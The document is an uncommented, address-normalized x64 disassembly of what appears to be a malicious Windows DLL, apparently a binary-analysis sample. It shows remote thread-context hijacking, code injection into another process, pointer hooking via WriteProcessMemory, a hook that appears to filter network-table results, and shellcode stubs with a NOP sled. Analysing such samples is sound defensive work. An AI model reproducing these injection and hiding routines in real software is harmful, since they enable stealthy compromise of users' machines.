mov [ rsp + 0x30 ] 0x0
call memset
lea rdx [ rsp + 0x30 ]
mov rcx rbx
mov [ rsp + 0x60 ] 0x100001
call [ GetThreadContext@IAT ]
test eax eax
je r-xdata
mov rbp [ rsp + 0x620 ]
test esi esi
mov rsi [ rsp + 0x618 ]
je r-xdata
cmp [ rsp + 0x128 ] 0x0
je r-xdata
mov rbx [ rsp + 0x648 ]
mov rcx [ rsp + 0x600 ]
xor rcx rsp
call sub_10010a60
add rsp 0x628
retn
mov rcx rbx
call [ ResumeThread@IAT ]
mov r9d 0x1000
xor edx edx
mov rcx rbp
mov r8 r9
mov [ rsp + 0x610 ] rdi
mov [ rsp + 0x20 ] 0x40
call [ VirtualAllocEx@IAT ]
test rax rax
mov rdi rax
je r-xdata
mov rdi [ rsp + 0x610 ]
lea rcx [ rsp + 0x500 ]
xor edx edx
mov r8d 0x100
call memset
lea rcx [ rsp + 0x500 ]
call j_sub_100102a6
mov rdx [ rsp + 0x128 ]
lea r8 [ rsp + 0x500 ]
mov [ rsp + 0x20 ] rdx
mov r9d eax
mov rcx rbp
mov rdx rdi
call sub_1000f1c0
test eax eax
je r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx rbx
mov [ rsp + 0x128 ] rdi
call [ SetThreadContext@IAT ]
sub_1000f4b0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov edx 0x104
mov [ rcx ] 0x0
mov [ rsp + 0x48 ] rdi
mov rbx rcx
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov rcx 0xffffffffffffffff
mov [ rdi - 0x1 ] ax
xor eax eax
mov rdi rbx
[ rdi ]
xor ecx ecx
lea rdx [ rw-data ]
nop
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
mov edx 0x2e
mov rcx rbx
call [ strchr@IAT ]
mov rdi [ rsp + 0x48 ]
test rax rax
mov rdx rax
jne r-xdata
mov eax [ r--data ]
mov [ rdx ] eax
movzx eax [ r--data ]
mov [ rdx + 0x4 ] ax
movzx eax [ r--data ]
mov [ rdx + 0x6 ] al
mov [ rbx ] al
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov [ rbx ] 0x0
mov rcx rbx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
sub_1000f570
mov r11 rsp
sub rsp 0x558
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x530 ] rax
mov [ r11 - 0x8 ] rbx
mov [ r11 - 0x10 ] rsi
lea rcx [ r11 - 0x368 ]
mov esi r9d
mov ebx edx
call sub_1000f4b0
cmp [ rsp + 0x1f0 ] 0x0
je r-xdata
mov rsi [ rsp + 0x548 ]
mov rbx [ rsp + 0x550 ]
mov rcx [ rsp + 0x530 ]
xor rcx rsp
call sub_10010a60
add rsp 0x558
retn
lea rcx [ rsp + 0xe0 ]
mov edx 0x104
mov [ rsp + 0x540 ] rdi
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
lea rdi [ rsp + 0xe0 ]
mov rcx 0xffffffffffffffff
[ rdi ]
mov rax [ r--data ]
lea rcx [ rsp + 0xe0 ]
mov [ rdi - 0x1 ] rax
mov rax [ r--data ]
mov [ rdi + 0x7 ] rax
mov eax [ r--data ]
mov [ rdi + 0xf ] eax
movzx eax [ r--data ]
mov [ rdi + 0x13 ] ax
movzx eax [ r--data ]
mov [ rdi + 0x15 ] al
call [ GetFileAttributesA@IAT ]
mov rdi [ rsp + 0x540 ]
cmp eax 0xffffffff
je r-xdata
lea r9 [ rsp + 0x1f0 ]
lea r8 [ rsp + 0xe0 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x300 ]
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] ebx
call [ sprintf@IAT ]
xor edx edx
lea rcx [ rsp + 0x70 ]
lea r8d [ rdx + 0x68 ]
call memset
lea rax [ rsp + 0x50 ]
lea rdx [ rsp + 0x300 ]
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0x70 ]
xor r9d r9d
mov [ rsp + 0x40 ] rax
xor eax eax
xor r8d r8d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rax
xor ecx ecx
mov [ rsp + 0x28 ] 0x8000000
mov [ rsp + 0x70 ] 0x68
mov [ rsp + 0xb0 ] 0x0
mov [ rsp + 0x20 ] eax
mov [ rsp + 0xac ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov ecx 0x32
call [ Sleep@IAT ]
mov rcx [ rsp + 0x50 ]
mov edx 0x3e8
call [ WaitForSingleObject@IAT ]
sub_1000f720
sub rsp 0x78
mov r10 [ rw-data ]
mov r11 rcx
test r10 r10
jne r-xdata
mov eax [ rsp + 0xa8 ]
mov [ rsp + 0x70 ] rbx
mov rbx [ rsp + 0xc8 ]
mov ecx eax
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x68 ] rdi
mov edi eax
or ecx 0x4
shr edi 0x2
not edi
and edi 0x1
test rbx rbx
cmove ecx eax
mov rax [ rsp + 0xc0 ]
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0xa0 ]
mov [ rsp + 0x28 ] ecx
mov rcx r11
mov [ rsp + 0x20 ] eax
call r10
test eax eax
jne r-xdata
xor eax eax
add rsp 0x78
retn
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x78
retn
mov rbx [ rsp + 0x70 ]
mov rdi [ rsp + 0x68 ]
mov eax 0x1
add rsp 0x78
retn
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
mov r8d edi
call sub_1000f360
mov rcx [ rbx ]
lea rdx [ rsp + 0x50 ]
mov [ rsp + 0x50 ] 0x0
call rax
test eax eax
je r-xdata
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov r9d [ rbx + 0x14 ]
mov r8 [ rbx + 0x8 ]
mov edx [ rbx + 0x10 ]
mov rcx [ rbx ]
call sub_1000f570
test edi edi
je r-xdata
mov rcx [ rbx + 0x8 ]
call [ ResumeThread@IAT ]
mov rbx [ rsp + 0x70 ]
mov rdi [ rsp + 0x68 ]
mov eax 0x1
add rsp 0x78
retn
sub_1000f860
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov rsi r9
mov rbp r8
mov rdi rdx
mov rbx rcx
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov rdx rdi
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx rbx
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov r8 rsi
mov rdx rbp
mov rcx rax
call sub_1000f050
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
sub_1000f8e0
push rbx
sub rsp 0x140
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
lea rdx [ rsp + 0x20 ]
mov r8d 0x104
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rsp + 0x20 ]
mov edx 0x5c
call [ strrchr@IAT ]
test rax rax
mov rbx rax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rax + 0x1 ]
call [ _stricmp@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
lea rdx [ r--data ]
lea rcx [ rbx + 0x1 ]
call [ _stricmp@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x140
pop rbx
retn
sub_1000f980
sub rsp 0x38
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
xor esi esi
test rcx rcx
mov [ rsp + 0x30 ] r12
mov rbp r8
mov rdi rcx
mov r12 rdx
jne r-xdata
mov eax [ rcx + 0x3c ]
cmp [ rax + rcx ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ rax + rcx + 0x90 ]
test ecx ecx
je r-xdata
mov r12 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
add rsp 0x38
retn
cmp [ rdi + rcx + 0x10 ] esi
mov [ rsp + 0x40 ] rbx
lea rbx [ rdi + rcx ]
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rax rsi
mov [ rsp + 0x28 ] r13
mov r13 0x8000000000000000
nop
nop
mov r13 [ rsp + 0x28 ]
mov rdx r12
call [ _stricmp@IAT ]
test eax eax
jne r-xdata
add rbx 0x14
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
mov eax [ rbx + 0x10 ]
cmp [ rax + rdi ] 0x0
lea r9 [ rax + rdi ]
je r-xdata
mov ecx [ rbx + 0xc ]
add rcx rdi
cmp [ rcx ] 0x0
je r-xdata
test rsi rsi
jne r-xdata
mov r10d [ rbx ]
sub r10 rax
nop
add r9 0x8
cmp [ r9 ] 0x0
jne r-xdata
lea r8 [ rax + rdi + 0x2 ]
test r8 r8
je r-xdata
mov rax [ r10 + r9 ]
test r13 rax
jne r-xdata
jmp r-xdata
mov rax rbp
sub r8 rbp
nop
nop
test edx edx
je r-xdata
add rax 0x1
test ecx ecx
jne r-xdata
mov rsi r9
movzx edx [ rax ]
movzx ecx [ rax + r8 ]
sub edx ecx
jne r-xdata
sub_1000faa0
sub rsp 0xd8
mov r10 [ rw-data ]
test r10 r10
jne r-xdata
mov eax [ rsp + 0x128 ]
mov [ rsp + 0xd0 ] rbx
mov ebx [ rsp + 0x108 ]
mov [ rsp + 0x48 ] eax
mov [ rsp + 0xb8 ] rdi
mov edi [ rsp + 0x118 ]
mov [ rsp + 0xb0 ] r12
mov r12 [ rsp + 0x110 ]
mov [ rsp + 0xa8 ] r13
mov r13 [ rsp + 0x120 ]
mov [ rsp + 0xa0 ] r14
mov [ rsp + 0x98 ] r15
mov r15 [ rsp + 0x100 ]
mov [ rsp + 0x40 ] r13
mov [ rsp + 0x38 ] edi
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] r15
call r10
test eax eax
mov r14d eax
mov [ rsp + 0x54 ] eax
js r-xdata
xor eax eax
add rsp 0xd8
retn
mov r12 [ rsp + 0xb0 ]
mov rdi [ rsp + 0xb8 ]
mov r13 [ rsp + 0xa8 ]
mov r14 [ rsp + 0xa0 ]
mov rbx [ rsp + 0xd0 ]
mov r15 [ rsp + 0x98 ]
add rsp 0xd8
retn
cmp ebx 0x12001b
mov [ rsp + 0xc8 ] rbp
mov [ rsp + 0xc0 ] rsi
jne r-xdata
cmp ebx 0x120003
jne r-xdata
cmp edi 0x48
jne r-xdata
mov rsi [ rsp + 0xc0 ]
mov rbp [ rsp + 0xc8 ]
mov rdx [ r12 ]
xor ebp ebp
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x68 ] 0x400
mov [ rsp + 0x6c ] ebp
mov [ rsp + 0x70 ] 0x200
mov [ rsp + 0x74 ] 0x100
mov [ rsp + 0x78 ] 0x101
cmp rdx [ rcx ]
jne r-xdata
mov eax r14d
mov r10 [ r12 + 0x18 ]
test r10 r10
mov [ rsp + 0x60 ] r10
je r-xdata
sbb eax eax
sbb eax 0xffffffff
mov rdx [ r12 + 0x8 ]
cmp rdx [ rcx + 0x8 ]
jne r-xdata
cmp [ r12 + 0x20 ] 0x38
jne r-xdata
mov rdx [ r12 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x78 ] 0x102
cmp rdx [ rcx ]
jne r-xdata
mov rax 0xcccccccccccccccd
mul [ r15 + 0x8 ]
mov rsi rdx
shr rsi 0x4
test esi esi
je r-xdata
mov edx [ r12 + 0x10 ]
cmp edx [ rcx + 0x10 ]
jne r-xdata
mov r9d [ r12 + 0x44 ]
mov rax [ r12 + 0x30 ]
xor ebp ebp
test r9d r9d
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x50 ] r9d
je r-xdata
sbb eax eax
sbb eax 0xffffffff
mov rdx [ r12 + 0x8 ]
cmp rdx [ rcx + 0x8 ]
jne r-xdata
mov eax esi
lea rcx [ rax + rax * 4 ]
shl rcx 0x2
mov [ r15 + 0x8 ] rcx
jmp r-xdata
lea rbx [ r13 + 0x11 ]
lea rdi [ r13 + 0x10 ]
nop
nop
nop
mov eax ebp
jmp r-xdata
lea r15d [ rdi - 0x47 ]
lea r13 [ r10 + 0x1f ]
lea r14 [ r10 + 0x1e ]
nop
nop
nop
mov rcx [ r12 ]
lea rax [ rsp + 0x68 ]
mov [ rsp + 0x78 ] 0x110
cmp rcx [ rax ]
jne r-xdata
mov rax 0xaaaaaaaaaaaaaaab
mul [ r15 + 0x8 ]
mov rsi rdx
shr rsi 0x4
test esi esi
je r-xdata
mov edx [ r12 + 0x10 ]
cmp edx [ rcx + 0x10 ]
jne r-xdata
add ebp 0x1
add rdi 0x14
add rbx 0x14
cmp ebp esi
jb r-xdata
mov eax esi
lea rcx [ rbp + rbp * 4 ]
sub eax ebp
lea rcx [ r13 + rcx * 4 ]
add eax 0xffffffff
lea rdx [ rcx + 0x14 ]
lea r8 [ rax + rax * 4 ]
shl r8 0x2
call memcpy
add esi 0xffffffff
add ebp 0xffffffff
sub rdi 0x14
sub rbx 0x14
test eax eax
jne r-xdata
add ebp 0x1
add r15d 0x1
add r14 0x38
add r13 0x38
cmp ebp r9d
jb r-xdata
mov eax r9d
mov edx r15d
mov ecx ebp
sub eax ebp
mov edi r15d
imul rdx rdx 0x38
imul rcx rcx 0x38
mov r8d eax
add rdx r10
add rcx r10
mov ebx eax
imul r8 r8 0x38
call memcpy
lea r8 [ rbx + rbx * 2 ]
mov rbx [ rsp + 0x58 ]
lea rax [ rdi + rdi * 2 ]
shl r8 0x2
lea rdx [ rbx + rax * 4 ]
lea rax [ rbp + rbp * 2 ]
lea rcx [ rbx + rax * 4 ]
call memcpy
mov r9d [ rsp + 0x50 ]
add [ r12 + 0x44 ] 0xffffffff
mov r10 [ rsp + 0x60 ]
add r9d 0xffffffff
add ebp 0xffffffff
add r15d 0xffffffff
sub r14 0x38
mov [ rsp + 0x50 ] r9d
sub r13 0x38
sbb eax eax
sbb eax 0xffffffff
mov rcx [ r12 + 0x8 ]
cmp rcx [ rax + 0x8 ]
jne r-xdata
mov eax esi
lea rcx [ rax + rax * 2 ]
shl rcx 0x3
mov [ r15 + 0x8 ] rcx
jmp r-xdata
lea rbx [ r13 + 0x11 ]
lea rdi [ r13 + 0x10 ]
nop
nop
nop
mov eax ebp
jmp r-xdata
movzx eax [ rbx ]
movzx ecx [ rdi ]
shl cx 0x8
or cx ax
call sub_1000ee20
test eax eax
je r-xdata
movzx eax [ r13 ]
movzx ecx [ r14 ]
shl cx 0x8
or cx ax
call sub_1000ee20
test eax eax
je r-xdata
mov r14d [ rsp + 0x54 ]
jmp r-xdata
mov rbx [ r15 + 0x8 ]
mov rax 0xa41a41a41a41a41b
mul rbx
sub rbx rdx
shr rbx 0x1
add rbx rdx
shr rbx 0x8
test ebx ebx
je r-xdata
mov ecx [ r12 + 0x10 ]
cmp ecx [ rax + 0x10 ]
jne r-xdata
add ebp 0x1
add rdi 0x18
add rbx 0x18
cmp ebp esi
jb r-xdata
mov eax esi
lea rcx [ rbp + rbp * 2 ]
sub eax ebp
lea rcx [ r13 + rcx * 8 ]
add eax 0xffffffff
lea rdx [ rcx + 0x18 ]
lea r8 [ rax + rax * 2 ]
shl r8 0x3
call memcpy
add esi 0xffffffff
add ebp 0xffffffff
sub rdi 0x18
sub rbx 0x18
test eax eax
jne r-xdata
mov eax ebx
imul rax rax 0x138
mov [ r15 + 0x8 ] rax
lea rdi [ r13 + 0x15 ]
lea rsi [ r13 + 0x14 ]
nop
mov eax ebp
jmp r-xdata
movzx eax [ rbx ]
movzx ecx [ rdi ]
shl cx 0x8
or cx ax
call sub_1000ee20
test eax eax
je r-xdata
add ebp 0x1
add rsi 0x138
add rdi 0x138
cmp ebp ebx
jb r-xdata
mov r8d ebx
mov ecx ebp
sub r8d ebp
imul rcx rcx 0x138
add r8d 0xffffffff
add rcx r13
imul r8 r8 0x138
lea rdx [ rcx + 0x138 ]
call memcpy
add ebx 0xffffffff
add ebp 0xffffffff
sub rsi 0x138
sub rdi 0x138
test eax eax
jne r-xdata
movzx eax [ rdi ]
movzx ecx [ rsi ]
shl cx 0x8
or cx ax
call sub_1000ee20
test eax eax
je r-xdata
sub_1000ff60
push rbx
sub rsp 0x100
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xf0 ] rax
call sub_1000f8e0
test eax eax
je r-xdata
lea rcx [ rsp + 0x54 ]
xor edx edx
mov r8d 0x90
lea rbx [ r--data ]
call memset
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x50 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea r9 [ rw-data ]
lea r8 [ sub_1000f720 ]
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_1000f860
mov rcx rbx
call [ LoadLibraryA@IAT ]
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rax
call sub_1000f980
test rax rax
mov rbx rax
je r-xdata
cmp [ rsp + 0x54 ] 0x6
lea rax [ r--data ]
cmovb rax rbx
mov rbx rax
mov rcx [ rsp + 0xf0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x100
pop rbx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov rcx [ rax ]
mov edx 0x8
lea rax [ sub_1000faa0 ]
mov [ rw-data ] rcx
lea r9 [ rsp + 0x30 ]
lea r8d [ rdx - 0x4 ]
mov rcx rbx
mov [ rsp + 0x38 ] rax
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x38 ]
mov r9d 0x8
mov rcx rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov [ rsp + 0x20 ] rax
call [ WriteProcessMemory@IAT ]
mov r8d [ rsp + 0x30 ]
lea r9 [ rsp + 0x30 ]
mov edx 0x8
mov rcx rbx
call [ VirtualProtect@IAT ]
sub_100100c5
push rbx
push rsi
push rdi
push rcx
push rdx
sub rsp 0x200
lea rsi [ rsp + 0x230 ]
mov rdi rsp
mov rcx 0x200
[ rdi ] [ rsi ]
mov rdx [ rsp + 0x200 ]
mov rcx [ rsp + 0x208 ]
mov rdi [ rsp + 0x210 ]
mov rsi [ rsp + 0x218 ]
mov rbx [ rsp + 0x220 ]
call [ r-xdata ]
add rsp 0x200
pop rdx
pop rcx
pop rdi
pop rsi
pop rbx
retn
sub_10010128
fxch st4
mov ebx 0x909090aa
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub_1001022c
push rbx
push rcx
push rdx
push rsi
push rdi
mov rdi rcx
lea rcx [ sub_1001022c ]
lea rax [ sub_100100c5 ]
sub rcx rax
mov rax rcx
lea rsi [ sub_100100c5 ]
cld
[ rdi ] [ rsi ]
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
retn
sub_10010264
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
sub rsp 0x200
mov rcx 0x1122334455667788
call [ r-xdata ]
jmp r-xdata
add rsp 0x200
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
jmp [ r-xdata ]
sub_100102a6
push rbx
push rcx
push rdx
push rsi
push rdi
mov rdi rcx
lea rcx [ sub_100102a6 ]
lea rax [ r-xdata ]
sub rcx rax
mov rax rcx
lea rsi [ r-xdata ]
cld
[ rdi ] [ rsi ]
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
retn
sub_100102e0
sub rsp 0x28
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ GetModuleHandleA@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
cmp [ rw-data ] 0x0
mov [ rw-data ] rax
je r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test rax rax
je r-xdata
mov eax 0x1
add rsp 0x28
retn
sub_10010970
push rbx
sub rsp 0x20
mov eax [ r8 ]
mov rbx rdx
mov r9 rcx
mov r11d eax
mov r10 rcx
and r11d 0xfffffff8
test al 0x4
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
movzx eax [ rcx + 0x3 ]
test al 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
